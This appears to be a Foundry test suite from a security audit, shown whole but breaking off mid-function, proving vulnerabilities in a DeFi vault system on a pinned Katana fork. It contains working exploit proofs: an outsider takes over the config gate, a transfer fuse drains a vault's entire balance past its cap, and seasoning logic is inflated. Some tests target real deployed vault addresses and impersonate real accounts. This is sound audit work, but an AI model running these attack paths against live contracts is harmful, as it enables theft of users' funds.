// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

// Attacker-owned fork regression. Imports unmodified SHA256-admitted production contracts.
import {Test} from "forge-std/Test.sol";
import {FuseAction} from "../../src/interfaces/CurveYieldPhase2Interfaces.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {CurveYieldMorphoLoopController} from "../../src/morpho/CurveYieldMorphoLoopController.sol";
import {CyLoopEnv} from "../../src/morpho/CurveYieldMorphoLoopLib.sol";
import {CurveYieldConfigKeys as K} from "../../src/governance/CurveYieldGateConfig.sol";
import {CurveYieldGateConfig, ICurveYieldConfigGate} from "../../src/governance/CurveYieldGateConfig.sol";
import {CurveYieldAllocationController} from "../../src/allocation/CurveYieldAllocationController.sol";
import {
    CurveYieldErc20TransferFuse,
    CurveYieldErc20TransferFuseEnterData
} from "../../src/generic/CurveYieldErc20TransferFuse.sol";
import {CurveYieldSubstrateLib as Sub} from "../../src/libraries/CurveYieldSubstrateLib.sol";
import {PlasmaVaultConfigLib} from "contracts/libraries/PlasmaVaultConfigLib.sol";

contract AttackerTestGate is ICurveYieldConfigGate {
    uint256 public immutable VALUE;
    constructor(uint256 value_) { VALUE = value_; }
    function getMany(bytes32[] calldata keys) external view override returns (uint256[] memory out) {
        out = new uint256[](keys.length);
        for (uint256 i; i < keys.length; ++i) out[i] = VALUE;
    }
    function addr(bytes32) external pure override returns (address) { return address(0xFEE1); }
    function adminReceiver() external pure override returns (address) { return address(0xFEE1); }
}
contract AttackerTestToken is ERC20 {
    constructor() ERC20("Audit Test", "ATST") {}
    function mint(address who, uint256 amount) external { _mint(who, amount); }
}
contract AttackerFuseExecutionVault {
    CurveYieldErc20TransferFuse public immutable FUSE;
    constructor(CurveYieldErc20TransferFuse fuse_) { FUSE = fuse_; }

    // A test-only stand-in for governance's ordinary substrate grant, in vault storage.
    function grant(address token, address recipient, uint256 cap) external {
        bytes32[] memory subs = new bytes32[](3);
        subs[0] = Sub.encodeAddress(Sub.TRANSFER_TOKEN, token);
        subs[1] = Sub.encodeAddress(Sub.TRANSFER_RECIPIENT, recipient);
        subs[2] = Sub.encodeCap(token, cap);
        PlasmaVaultConfigLib.grantMarketSubstrates(Sub.CONFIG_MARKET, subs);
    }
    function transferByFuse(address token, address recipient, uint256 requested) external returns (uint256 sent) {
        (bool ok, bytes memory ret) = address(FUSE).delegatecall(abi.encodeWithSelector(
            CurveYieldErc20TransferFuse.enter.selector,
            CurveYieldErc20TransferFuseEnterData(token, recipient, requested)
        ));
        if (!ok) assembly { revert(add(ret, 32), mload(ret)) }
        sent = abi.decode(ret, (uint256));
    }
}
contract AttackerForkConformance_v1 is Test {
    address constant OUTSIDER = address(0xA77AC);
    address constant APPROVED_RECIPIENT = address(0xA1100);
    uint256 constant PINNED_KATANA_BLOCK = 45121798;

    function setUp() public {
        assertEq(block.chainid, 747474, "Use verified Katana fork, never production broadcast");
        assertEq(block.number, PINNED_KATANA_BLOCK, "Fork must be pinned for evidence binding");
    }
    function test_OUTSIDER_canReplaceInheritedGovernanceGate() public {
        AttackerTestGate genuine = new AttackerTestGate(500);
        AttackerTestGate hostile = new AttackerTestGate(9500);
        CurveYieldAllocationController target = new CurveYieldAllocationController(
            address(this), address(0xA11CE), address(0xB00B), address(genuine)
        );
        assertEq(target.vaultFloorBps(), 500, "healthy gate");
        assertEq(target.owner(), address(this), "controller has separate authorized owner");
        vm.prank(OUTSIDER);
        target.setConfigGate(address(hostile));
        assertEq(target.configGate(), address(hostile), "outsider changed active gate");
        assertEq(target.vaultFloorBps(), 9500, "outsider controls live economic config read");
        assertEq(target.owner(), address(this), "ownership did not change");
        emit log_string("CONFIRMED_UNPRIVILEGED_GATE_REPLACEMENT");
        emit log_named_address("outsider", OUTSIDER);
        emit log_named_address("malicious_configGate", target.configGate());
        emit log_named_uint("forged_vault_floor_bps", target.vaultFloorBps());
    }
    function test_OUTSIDER_canBreakConfigReadsViaNoCodeGate() public {
        AttackerTestGate genuine = new AttackerTestGate(200);
        CurveYieldAllocationController target = new CurveYieldAllocationController(
            address(this), address(0xA11CE), address(0xB00B), address(genuine)
        );
        assertEq(target.vaultFloorBps(), 200);
        vm.prank(OUTSIDER);
        target.setConfigGate(address(0xDEAD));
        assertEq(target.configGate(), address(0xDEAD));
        vm.expectRevert();
        target.vaultFloorBps();
        emit log_string("CONFIRMED_OUTSIDER_GATE_SETTER_CAN_CAUSE_VIEW_DOS");
    }
    function test_GRANTED_FUSE_transfersEntireBalanceDespiteSmallCap() public {
        AttackerTestToken token = new AttackerTestToken();
        CurveYieldErc20TransferFuse fuse = new CurveYieldErc20TransferFuse(7);
        AttackerFuseExecutionVault vault = new AttackerFuseExecutionVault(fuse);
        uint256 inventory = 1_000 ether;
        uint256 requested = 1 ether;
        uint256 cap = 10 ether;
        vault.grant(address(token), APPROVED_RECIPIENT, cap);
        token.mint(address(vault), inventory);
        uint256 sent = vault.transferByFuse(address(token), APPROVED_RECIPIENT, requested);
        assertEq(sent, inventory, "fuse sends full vault balance, not requested amount");
        assertGt(sent, cap, "actual payout bypasses granted per-call cap");
        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(APPROVED_RECIPIENT), inventory);
        emit log_string("CONFIRMED_FUSE_BALANCE_OVERPAYMENT");
        emit log_named_uint("requested", requested);
        emit log_named_uint("cap", cap);
        emit log_named_uint("actual_sent", sent);
    }
    function test_GRANTED_FUSE_revertsWhenRequestedExceedsBalance() public {
        AttackerTestToken token = new AttackerTestToken();
        CurveYieldErc20TransferFuse fuse = new CurveYieldErc20TransferFuse(7);
        AttackerFuseExecutionVault vault = new AttackerFuseExecutionVault(fuse);
        vault.grant(address(token), APPROVED_RECIPIENT, 10 ether);
        token.mint(address(vault), 1 ether);
        vm.expectRevert();
        vault.transferByFuse(address(token), APPROVED_RECIPIENT, 5 ether);
        assertEq(token.balanceOf(address(vault)), 1 ether);
        emit log_string("CONFIRMED_FUSE_UNDERFUNDED_REQUEST_REVERT");
    }
    function test_FUSE_stillEnforcesRecipientSubstrate() public {
        AttackerTestToken token = new AttackerTestToken();
        CurveYieldErc20TransferFuse fuse = new CurveYieldErc20TransferFuse(7);
        AttackerFuseExecutionVault vault = new AttackerFuseExecutionVault(fuse);
        vault.grant(address(token), APPROVED_RECIPIENT, 10 ether);
        token.mint(address(vault), 100 ether);
        vm.expectRevert();
        vault.transferByFuse(address(token), OUTSIDER, 1 ether);
        assertEq(token.balanceOf(OUTSIDER), 0);
        emit log_string("NEGATIVE_CONTROL_UNGRANTED_RECIPIENT_BLOCKED");
    }
}

interface ILiveVaultExposure {
    function getFuses() external view returns (address[] memory);
    function getMarketSubstrates(uint256 market) external view returns (bytes32[] memory);
    function addFuses(address[] calldata) external;
    function grantMarketSubstrates(uint256, bytes32[] calldata) external;
    function execute(FuseAction[] calldata) external;
    function isFuseSupported(address) external view returns (bool);
}

// Observational actual-vault fork probes. Unlike the five source-exact fixture proofs,
// these establish which guards, grants, balances, and fuse install paths are really present
// at the pinned block. All writes are confined to the disposable Forge fork.
contract AttackerRealVaultExposure_v1 is Test {
    address constant REAL_VAULT = 0xEd83daf48429cfb2C650Fd721b9241e180fd4548;
    address constant REAL_AVKAT = 0x7231dbaCdFc968E07656D12389AB20De82FbfCeB;
    address constant REAL_DEPLOYER = 0x11b78837cadC8E894F1c6e13fA9f3A085a75FA35;
    address constant REAL_SAFE = 0x47623C62f281807D615eeb4A2CEee9d97F9D3C49;
    address constant UNPRIVILEGED = address(0xA77AC);
    uint256 constant BLOCK = 45121798;

    function setUp() public {
        assertEq(block.chainid, 747474, "Katana fork only");
        assertEq(block.number, BLOCK, "Pinned state required");
        assertGt(REAL_VAULT.code.length, 0, "Real vault must exist");
    }

    function test_NATIVE_realVaultInstalledFusesAndGrantsSnapshot() public {
        ILiveVaultExposure vault = ILiveVaultExposure(REAL_VAULT);
        emit log_string("NATIVE_PRESERVED_STATE_SNAPSHOT");
        emit log_named_address("real_vault", REAL_VAULT);
        emit log_named_bytes32("real_vault_codehash", REAL_VAULT.codehash);
        address[] memory installed = vault.getFuses();
        emit log_named_uint("existing_installed_fuses", installed.length);
        for (uint256 i = 0; i < installed.length; ++i) {
            emit log_named_address("existing_installed_fuse", installed[i]);
        }
        bytes32[] memory grants = vault.getMarketSubstrates(Sub.CONFIG_MARKET);
        emit log_named_uint("existing_config_market_substrates", grants.length);
        uint256 tokenGrants;
        uint256 recipientGrants;
        uint256 capGrants;
        for (uint256 i; i < grants.length; ++i) {
            uint256 kind = uint256(grants[i]) >> 248;
            if (kind == Sub.TRANSFER_TOKEN) {tokenGrants++; emit log_named_bytes32("existing_transfer_token", grants[i]);}
            if (kind == Sub.TRANSFER_RECIPIENT) {recipientGrants++; emit log_named_bytes32("existing_transfer_recipient", grants[i]);}
            if (kind == Sub.TRANSFER_CAP) {capGrants++; emit log_named_bytes32("existing_transfer_cap", grants[i]);}
        }
        emit log_named_uint("existing_transfer_token_grants", tokenGrants);
        emit log_named_uint("existing_transfer_recipient_grants", recipientGrants);
        emit log_named_uint("existing_transfer_cap_grants", capGrants);
        emit log_named_uint("real_vault_avkat_balance", IERC20(REAL_AVKAT).balanceOf(REAL_VAULT));
    }

    function test_NATIVE_unprivilegedCannotManageRealVaultFusesAndGrants() public {
        CurveYieldErc20TransferFuse fuse = new CurveYieldErc20TransferFuse(7);
        address[] memory one = new address[](1);
        one[0] = address(fuse);
        vm.prank(UNPRIVILEGED);
        (bool canRegister, bytes memory registerReturn) = REAL_VAULT.call(abi.encodeCall(ILiveVaultExposure.addFuses, (one)));
        emit log_named_string("outsider_register_fuse", canRegister ? "UNEXPECTED_SUCCESS" : "BLOCKED");
        emit log_named_bytes("outsider_register_reason", registerReturn);
        assertFalse(canRegister, "outsider must not install arbitrary fuse");
        bytes32[] memory substr = new bytes32[](1);
        substr[0] = Sub.encodeAddress(Sub.TRANSFER_RECIPIENT, UNPRIVILEGED);
        vm.prank(UNPRIVILEGED);
        (bool canGrant, bytes memory grantReturn) = REAL_VAULT.call(abi.encodeCall(ILiveVaultExposure.grantMarketSubstrates, (Sub.CONFIG_MARKET, substr)));
        emit log_named_string("outsider_grant_substrate", canGrant ? "UNEXPECTED_SUCCESS" : "BLOCKED");
        emit log_named_bytes("outsider_grant_reason", grantReturn);
        assertFalse(canGrant, "outsider must not set recipient grants");
        emit log_string("NATIVE_OUTSIDER_FUSE_AND_SUBSTRATE_MUTATIONS_BLOCKED");
    }

    function test_NATIVE_authorizedReconfigurationPathAndTransferAccounting() public {
        ILiveVaultExposure vault = ILiveVaultExposure(REAL_VAULT);
        CurveYieldErc20TransferFuse fuse = new CurveYieldErc20TransferFuse(7);
        address[] memory one = new address[](1);
        one[0] = address(fuse);
        vm.prank(REAL_DEPLOYER);
        (bool canRegister, bytes memory registerReturn) = REAL_VAULT.call(abi.encodeCall(ILiveVaultExposure.addFuses, (one)));
        emit log_named_string("authorized_add_source_fuse", canRegister ? "SUCCESS" : "BLOCKED");
        emit log_named_bytes("authorized_add_source_fuse_ret", registerReturn);
        if (!canRegister) {
            emit log_string("NATIVE_RECONFIG_ROUTE_UNAVAILABLE_AT_PINNED_BLOCK");
            return;
        }
        assertTrue(vault.isFuseSupported(address(fuse)), "registered source fuse supported");
        bytes32[] memory original = vault.getMarketSubstrates(Sub.CONFIG_MARKET);
        bytes32[] memory config = new bytes32[](original.length + 3);
        for (uint256 i; i < original.length; ++i) config[i] = original[i];
        config[original.length] = Sub.encodeAddress(Sub.TRANSFER_TOKEN, REAL_AVKAT);
        config[original.length + 1] = Sub.encodeAddress(Sub.TRANSFER_RECIPIENT, REAL_SAFE);
        config[original.length + 2] = Sub.encodeCap(REAL_AVKAT, 1);
        vm.prank(REAL_DEPLOYER);
        (bool canGrant, bytes memory grantReturn) = REAL_VAULT.call(abi.encodeCall(ILiveVaultExposure.grantMarketSubstrates, (Sub.CONFIG_MARKET, config)));
        emit log_named_string("authorized_grant_source_fuse_config", canGrant ? "SUCCESS" : "BLOCKED");
        emit log_named_bytes("authorized_grant_source_fuse_config_ret", grantReturn);
        if (!canGrant) {
            emit log_string("NATIVE_RECONFIG_GRANT_UNAVAILABLE_AT_PINNED_BLOCK");
            return;
        }
        uint256 balanceBefore = IERC20(REAL_AVKAT).balanceOf(REAL_VAULT);
        uint256 recipientBefore = IERC20(REAL_AVKAT).balanceOf(REAL_SAFE);
        emit log_named_uint("real_vault_avkat_before", balanceBefore);
        if (balanceBefore <= 1) {
            emit log_string("NATIVE_RECONFIG_NO_NONTRIVIAL_LIVE_TOKEN_INVENTORY");
            return;
        }
        FuseAction[] memory calls = new FuseAction[](1);
        calls[0] = FuseAction(address(fuse), abi.encodeCall(
            CurveYieldErc20TransferFuse.enter,
            (CurveYieldErc20TransferFuseEnterData(REAL_AVKAT, REAL_SAFE, 1))
        ));
        vm.prank(REAL_DEPLOYER);
        (bool executed, bytes memory returnOrRevert) = REAL_VAULT.call(abi.encodeCall(ILiveVaultExposure.execute, (calls)));
        emit log_named_string("authorized_real_vault_execute_source_fuse", executed ? "SUCCESS" : "BLOCKED");
        emit log_named_bytes("authorized_execute_ret", returnOrRevert);
        if (!executed) {
            emit log_string("NATIVE_RECONFIG_EXECUTION_BLOCKED_AT_PINNED_BLOCK");
            return;
        }
        uint256 balanceAfter = IERC20(REAL_AVKAT).balanceOf(REAL_VAULT);
        uint256 recipientAfter = IERC20(REAL_AVKAT).balanceOf(REAL_SAFE);
        emit log_named_uint("real_vault_avkat_after", balanceAfter);
        emit log_named_uint("safe_avkat_delta", recipientAfter - recipientBefore);
        emit log_named_uint("requested_and_cap_base_units", 1);
        if (recipientAfter - recipientBefore > 1 && balanceBefore > balanceAfter) {
            emit log_string("NATIVE_AUTHORIZED_RECONFIG_OVERPAYMENT_REPRODUCED_ON_REAL_VAULT_FORK");
            assertEq(recipientAfter - recipientBefore, balanceBefore - balanceAfter);
        } else {
            emit log_string("NATIVE_AUTHORIZED_RECONFIG_NO_OVERPAYMENT_OBSERVED");
        }
    }
}

contract AttackerSeasoningRewardsStub_v1 {
    function balanceOf() external pure returns (uint256) { return 0; }
}
contract AttackerSeasoningGate_v1 is ICurveYieldConfigGate {
    uint256 public immutable DAYS;
    address public immutable REWARDS;
    constructor(uint256 days_, address rewards_) {
        DAYS = days_;
        REWARDS = rewards_;
    }
    function getMany(bytes32[] calldata keys) external view override returns (uint256[] memory v) {
        v = new uint256[](keys.length);
        for (uint256 i; i < keys.length; i++) v[i] = DAYS;
    }
    function addr(bytes32) external view override returns (address) { return REWARDS; }
    function adminReceiver() external view override returns (address) { return REWARDS; }
}
contract AttackerSeasoningProof_v1 is Test {
    function _fixture(uint256 days_) internal returns (CurveYieldAllocationController alloc, AttackerTestToken token) {
        token = new AttackerTestToken();
        AttackerSeasoningRewardsStub_v1 rewards = new AttackerSeasoningRewardsStub_v1();
        AttackerSeasoningGate_v1 gate = new AttackerSeasoningGate_v1(days_, address(rewards));
        alloc = new CurveYieldAllocationController(address(this), address(0xDA1), address(token), address(gate));
    }

    function test_SEASONING_uncheckpointedGapCountsJustDepositedCapitalAsAged() public {
        assertEq(block.chainid, 747474);
        assertEq(block.number, 45121798);
        (CurveYieldAllocationController alloc, AttackerTestToken token) = _fixture(3);
        uint256 dayStart = (block.timestamp / 1 days) * 1 days;
        vm.warp(dayStart + 1 hours);
        token.mint(address(0xDA1), 100 ether);
        alloc.checkpoint();
        uint256 oldDay = block.timestamp / 1 days;
        assertEq(alloc.dailyLow(oldDay), 100 ether);
        vm.warp(dayStart + 4 days + 2 hours);
        token.mint(address(0xDA1), 100 ether); // new deposit aged zero days
        alloc.checkpoint(); // permissionless; fills three missed days
        assertEq(alloc.dailyLow(oldDay + 1), 200 ether, "missed day incorrectly gets NEW capital");
        assertEq(alloc.dailyLow(oldDay + 2), 200 ether);
        assertEq(alloc.dailyLow(oldDay + 3), 200 ether);
        assertEq(alloc.seasonedManagedAvkat(), 200 ether, "deposit just now is incorrectly seasoned");
        emit log_string("CONFIRMED_SEASONING_MISSED_DAY_GAP_COUNTS_FRESH_CAPITAL");
        emit log_named_uint("legitimate_old_seasoned_amount", 100 ether);
        emit log_named_uint("fresh_deposit_amount", 100 ether);
        emit log_named_uint("current_seasoned_reported", alloc.seasonedManagedAvkat());
    }

    function test_SEASONING_sameDayHighReplacesLowAndSkipsFullDay() public {
        assertEq(block.chainid, 747474);
        assertEq(block.number, 45121798);
        (CurveYieldAllocationController alloc, AttackerTestToken token) = _fixture(1);
        uint256 dayStart = (block.timestamp / 1 days) * 1 days;
        vm.warp(dayStart + 1 hours);
        token.mint(address(0xDA1), 100 ether);
        alloc.checkpoint();
        uint256 day = block.timestamp / 1 days;
        vm.warp(dayStart + 23 hours);
        token.mint(address(0xDA1), 100 ether);
        alloc.checkpoint(); // raises "daily low" after a deposit on the same day
        assertEq(alloc.dailyLow(day), 200 ether, "daily low overwritten by daily high");
        vm.warp(dayStart + 1 days + 1 minutes);
        assertEq(alloc.seasonedManagedAvkat(), 200 ether, "fresh capital passes full-day seasoning");
        emit log_string("CONFIRMED_SEASONING_DAILY_LOW_IS_MAXIMUM_NOT_MINIMUM");
        emit log_named_uint("same_day_original_managed", 100 ether);
        emit log_named_uint("same_day_final_managed", 200 ether);
        emit log_named_uint("next_day_credited_managed", alloc.seasonedManagedAvkat());
    }
}

contract AttackerLoopBridgeGate_v1 is ICurveYieldConfigGate {
    uint256 public immutable SEASONING_DAYS;
    uint256 public immutable ALLOCATION_BPS;
    address public immutable REWARDS;
    constructor(uint256 seasoningDays_, uint256 allocationBps_, address rewards_) {
        SEASONING_DAYS = seasoningDays_;
        ALLOCATION_BPS = allocationBps_;
        REWARDS = rewards_;
    }
    function getMany(bytes32[] calldata keys) external view override returns (uint256[] memory out) {
        out = new uint256[](keys.length);
        for (uint256 i; i < keys.length; ++i) {
            if (keys[i] == K.ALLOC_SEASONING_DAYS) out[i] = SEASONING_DAYS;
            if (keys[i] == K.LOOP_ALLOCATION_BPS) out[i] = ALLOCATION_BPS;
        }
    }
    function addr(bytes32) external view override returns (address) { return REWARDS; }
    function adminReceiver() external view override returns (address) { return REWARDS; }
}
contract AttackerLoopCapBridge_v1 is Test {
    address constant VAULT = address(0xDA1);
    address constant OUTSIDER = address(0xA77AC);

    function _setup(uint256 days_, uint256 allocationBps_)
        internal returns (CurveYieldAllocationController alloc, CurveYieldMorphoLoopController loop, AttackerTestToken token)
    {
        token = new AttackerTestToken();
        AttackerSeasoningRewardsStub_v1 rewards = new AttackerSeasoningRewardsStub_v1();
        AttackerLoopBridgeGate_v1 gate = new AttackerLoopBridgeGate_v1(days_, allocationBps_, address(rewards));
        alloc = new CurveYieldAllocationController(address(this), VAULT, address(token), address(gate));
        CyLoopEnv memory env;
        env.vault = VAULT;
        env.morpho = address(0xB001);
        env.marketId = bytes32(uint256(1));
        env.avkat = address(token);
        env.kat = address(0xCA7);
        env.collateralFuse = address(0xF001);
        env.borrowFuse = address(0xF002);
        env.flashLoanFuse = address(0xF003);
        env.swapFuse = address(0xF004);
        env.router = address(0xF005);
        env.guardFuse = address(0xF006);
        env.withdrawManager = address(0xF007);
        loop = new CurveYieldMorphoLoopController(address(this), env, address(gate));
        loop.setAllocation(address(alloc));
    }

    function test_LOOP_realPlannerWindupLimitDoublesOnFreshDepositWithoutSeasoning() public {
        assertEq(block.chainid, 747474);
        assertEq(block.number, 45121798);
        (CurveYieldAllocationController alloc, CurveYieldMorphoLoopController loop, AttackerTestToken token) = _setup(3, 7500);
        uint256 dayStart = block.timestamp / 1 days * 1 days;
        vm.warp(dayStart + 1 hours);
        token.mint(VAULT, 100 ether);
        alloc.checkpoint();
        assertEq(loop.windupLimit(), 75 ether, "genuine seasoned baseline 75% of 100");
        vm.warp(dayStart + 4 days + 1 hours);
        token.mint(VAULT, 100 ether); // fresh same-block capital
        alloc.checkpoint();
        assertEq(alloc.seasonedManagedAvkat(), 200 ether, "fresh capital treated as 3-day aged");
        assertEq(loop.windupLimit(), 150 ether, "exact MorphoLoop planner permits twice baseline");
        emit log_string("CONFIRMED_LOOP_PLANNER_WINDUP_LIMIT_DOUBLED_FROM_UNSEASONED_DEPOSIT");
        emit log_named_uint("baseline_limit", 75 ether);
        emit log_named_uint("inflated_limit", loop.windupLimit());
    }

    function test_LOOP_unprivilegedGateTakeoverRaisesSourceExactPlannerLimit() public {
        assertEq(block.chainid, 747474);
        assertEq(block.number, 45121798);
        (CurveYieldAllocationController alloc, CurveYieldMorphoLoopController loop, AttackerTestToken token) = _setup(3, 7500);
        token.mint(VAULT, 100 ether);
        alloc.checkpoint();
        assertEq(loop.windupLimit(), 75 ether);
        AttackerLoopBridgeGate_v1 hostile = new AttackerLoopBridgeGate_v1(0, 10000, address(0xFEE1));
        vm.prank(OUTSIDER);
        loop.setConfigGate(address(hostile));
        assertEq(loop.windupLimit(), 100 ether, "unauthorized adjustment raises cap to 100%");
        assertEq(loop.owner(), address(this), "owner stays unchanged");
        emit log_string("CONFIRMED_UNPRIVILEGED_LOOP_GATE_TAKEOVER_RAISES_PLANNER_CAP");
        emit log_named_uint("original_limit", 75 ether);
        emit log_named_uint("forged_limit", loop.windupLimit());
    }
}
contract AttackerDeploymentAddressProbe_v1 is Test {
    address constant SOURCE_DEPLOYED_ALLOCATION = 0xaeA961347C49CE1c3b05D443E6d1A84098EaC78F;
    address constant SOURCE_DEPLOYED_EXECUTOR = 0xc3CD95d239C1CF53B9Ad89Ab130727792E1495E4;
    address constant SOURCE_DEPLOYED_LOOP = 0x5A4E14b0C0C098dE06d55068d91d554dAF767108;
    address constant SOURCE_DEPLOYED_ROUTER = 0x779E94f2b14D9F7032a205Af67Cf67329f7559C9;
    address constant OUTSIDER = address(0xA77AC);

    function test_DEPLOYED_snapshotAddressesPresenceAtPinnedKatanaBlock() public {
        assertEq(block.chainid, 747474);
        assertEq(block.number, 45121798);
        emit log_named_uint("snapshot_allocation_runtime_bytes", SOURCE_DEPLOYED_ALLOCATION.code.length);
        emit log_named_uint("snapshot_executor_runtime_bytes", SOURCE_DEPLOYED_EXECUTOR.code.length);
        emit log_named_uint("snapshot_loop_runtime_bytes", SOURCE_DEPLOYED_LOOP.code.length);
        emit log_named_uint("snapshot_router_runtime_bytes", SOURCE_DEPLOYED_ROUTER.code.length);
        if (SOURCE_DEPLOYED_ALLOCATION.code.length == 0) emit log_string("PINNED_ALLOCATION_REPORT_ADDRESS_HAS_NO_ONCHAIN_CODE");
        else emit log_string("PINNED_ALLOCATION_REPORT_ADDRESS_HAS_RUNTIME_CODE");
        if (SOURCE_DEPLOYED_LOOP.code.length == 0) emit log_string("PINNED_LOOP_REPORT_ADDRESS_HAS_NO_ONCHAIN_CODE");
        else emit log_string("PINNED_LOOP_REPORT_ADDRESS_HAS_RUNTIME_CODE");
    }

    function test_DEPLOYED_ifAllocationExistsOutsiderCanOrCannotChangeGate() public {
        assertEq(block.chainid, 747474);
        assertEq(block.number, 45121798);
        if (SOURCE_DEPLOYED_ALLOCATION.code.length == 0) {
            emit log_string("REAL_INSTALLED_ALLOCATION_GATE_TEST_NOT_APPLICABLE_ADDRESS_ABSENT");
            return;
        }
        (bool preOk, bytes memory prev) = SOURCE_DEPLOYED_ALLOCATION.staticcall(abi.encodeWithSignature("configGate()"));
        assertTrue(preOk && prev.length == 32, "real configGate baseline");
        address original = abi.decode(prev, (address));
        vm.prank(OUTSIDER);
        (bool ok, bytes memory returned) = SOURCE_DEPLOYED_ALLOCATION.call(abi.encodeWithSignature("setConfigGate(address)", address(0xFEE1)));
        emit log_named_string("pinned_allocation_outsider_setGate", ok ? "SUCCESS" : "BLOCKED");
        emit log_named_bytes("pinned_allocation_outsider_setGate_returndata", returned);
        (bool afterOk, bytes memory ret) = SOURCE_DEPLOYED_ALLOCATION.staticcall(abi.encodeWithSignature("configGate()"));
        assertTrue(afterOk && ret.length == 32, "configGate still readable");
        address updated = abi.decode(ret, (address));
        emit log_named_address("pinned_original_gate", original);
        emit log_named_address("pinned_updated_gate", updated);
        if (ok && updated == address(0xFEE1)) emit log_string("CONFIRMED_PINNED_ALLOCATION_INSTANCE_GATE_TAKEOVER");
        else emit log_string("PINNED_ALLOCATION_INSTANCE_GATE_TAKEOVER_BLOCKED_OR_NOT_EFFECTIVE");
    }
}

contract AttackerRealVaultFundedTransfer_v1 is Test {
    function _decodeAllowed(bytes memory ret) internal pure returns(bool allowed) { (allowed,) = abi.decode(ret,(bool,uint32)); }

    address constant VAULT = 0xEd83daf48429cfb2C650Fd721b9241e180fd4548;
    address constant AVKAT = 0x7231dbaCdFc968E07656D12389AB20De82FbfCeB;
    address constant HOLDER = 0xe7D109Ce6b34447Dd45B54e5615F4177291D5ADf;
    address constant SAFE = 0x47623C62f281807D615eeb4A2CEee9d97F9D3C49;
    address constant DEPLOYER = 0x11b78837cadC8E894F1c6e13fA9f3A085a75FA35;
    address constant PREVIOUS_EXECUTOR = 0x8AB2F85E6e623A1A9998448ea34F0039D4aC2152;
    address constant OLD_WM = 0x59B340EAb30AFE0cecD51C609d3190e8C75C40AE;
    address constant MANAGER = 0xd7f408f203c5c6a76c9c55c9f6b015929F151fAA;
    address constant OUTSIDER = address(0xA77AC);
    function setUp() public {
        assertEq(block.chainid, 747474);
        assertEq(block.number, 45121798);
        assertGt(VAULT.code.length, 0, "actual vault code must exist");
        assertGt(AVKAT.code.length, 0, "actual AVKAT code must exist");
    }
    function test_NATIVE_checkActualAlphaAndRealAvkatFundingBeforeValueTest() public {
        address[6] memory candidates = [DEPLOYER, PREVIOUS_EXECUTOR, SAFE, OLD_WM, HOLDER, OUTSIDER];
        for (uint256 i; i < candidates.length; i++) {
            (bool ok, bytes memory ret) = MANAGER.staticcall(abi.encodeWithSignature(
                "canCall(address,address,bytes4)", candidates[i], VAULT, ILiveVaultExposure.execute.selector
            ));
            bool allowed = ok && ret.length >= 64 && _decodeAllowed(ret);
            emit log_named_address("execute_candidate", candidates[i]);
            emit log_named_uint("execute_candidate_allowed", allowed?1:0);
        }
        emit log_named_uint("authentic_avkat_holder_balance", IERC20(AVKAT).balanceOf(HOLDER));
        emit log_named_uint("authentic_vaultholder_balance", IERC20(AVKAT).balanceOf(VAULT));
        assertGt(IERC20(AVKAT).balanceOf(HOLDER), 1 ether, "source real holder should fund test");
        emit log_string("NATIVE_REAL_ALPHA_AND_FUNDED_HOLDER_PROBED");
    }
    function test_NATIVE_authorizedFusePayoutOnRealVaultUsingTransferredGenuineAvkat() public {
        uint256 input = 1 ether;
        uint256 sourceBalance = IERC20(AVKAT).balanceOf(HOLDER);
        assertGt(sourceBalance, input, "real holder must be able to transfer token inventory");
        uint256 beforeVault = IERC20(AVKAT).balanceOf(VAULT);
        uint256 beforeSafe = IERC20(AVKAT).balanceOf(SAFE);
        vm.prank(HOLDER);
        IERC20(AVKAT).transfer(VAULT, input);
        assertEq(IERC20(AVKAT).balanceOf(VAULT), beforeVault+input, "genuine ERC20 transfer into actual vault");
        emit log_named_uint("fork_transfer_genuine_avkat_funding", input);
        CurveYieldErc20TransferFuse fuse = new CurveYieldErc20TransferFuse(7);
        address[] memory one = new address[](1);
        one[0] = address(fuse);
        vm.prank(DEPLOYER);
        ILiveVaultExposure(VAULT).addFuses(one);
        bytes32[] memory sub = new bytes32[](3);
        sub[0] = Sub.encodeAddress(Sub.TRANSFER_TOKEN, AVKAT);
        sub[1] = Sub.encodeAddress(Sub.TRANSFER_RECIPIENT, SAFE);
        sub[2] = Sub.encodeCap(AVKAT, 1);
        vm.prank(DEPLOYER);
        ILiveVaultExposure(VAULT).grantMarketSubstrates(Sub.CONFIG_MARKET, sub);
        FuseAction[] memory actions = new FuseAction[](1);
        actions[0] = FuseAction(address(fuse), abi.encodeCall(
            CurveYieldErc20TransferFuse.enter, (CurveYieldErc20TransferFuseEnterData(AVKAT, SAFE, 1))
        ));
        address[4] memory candidates = [PREVIOUS_EXECUTOR, DEPLOYER, SAFE, OLD_WM];
        address alpha;
        for (uint256 i; i < candidates.length; i++) {
            (bool ok, bytes memory ret) = MANAGER.staticcall(abi.encodeWithSignature(
                "canCall(address,address,bytes4)", candidates[i], VAULT, ILiveVaultExposure.execute.selector
            ));
            if (ok && ret.length >= 64) {
                (bool allowed, uint32 delay) = abi.decode(ret,(bool,uint32));
                if (allowed && delay == 0) {alpha=candidates[i]; break;}
            }
        }
        if (alpha == address(0)) {
            emit log_string("NATIVE_REAL_FUSE_VALID_ALPHA_NOT_FOUND_UNDER_KNOWN_ACTORS");
            return;
        }
        emit log_named_address("actual_authorized_vault_executor", alpha);
        emit log_named_uint("actual_vault_total_assets_before", IERC4626(VAULT).totalAssets());
        emit log_named_uint("actual_vault_total_shares_before", IERC20(VAULT).totalSupply());
        vm.prank(alpha);
        (bool executed, bytes memory data) = VAULT.call(abi.encodeCall(ILiveVaultExposure.execute,(actions)));
        emit log_named_string("actual_funded_vault_fuse_execute", executed ? "SUCCESS" : "BLOCKED");
        emit log_named_bytes("actual_funded_vault_execute_return",data);
        if (!executed) {
            emit log_string("NATIVE_ACTUAL_FUNDED_VAULT_EXECUTE_BLOCKED_BY_REVERT");
            return;
        }
        uint256 afterVault = IERC20(AVKAT).balanceOf(VAULT);
        uint256 afterSafe = IERC20(AVKAT).balanceOf(SAFE);
        uint256 sent = beforeVault+input-afterVault;
        uint256 recieved = afterSafe-beforeSafe;
        emit log_named_uint("actual_requested",1);
        emit log_named_uint("actual_transfer_cap",1);
        emit log_named_uint("actual_vault_debit",sent);
        emit log_named_uint("actual_safe_credit",recieved);
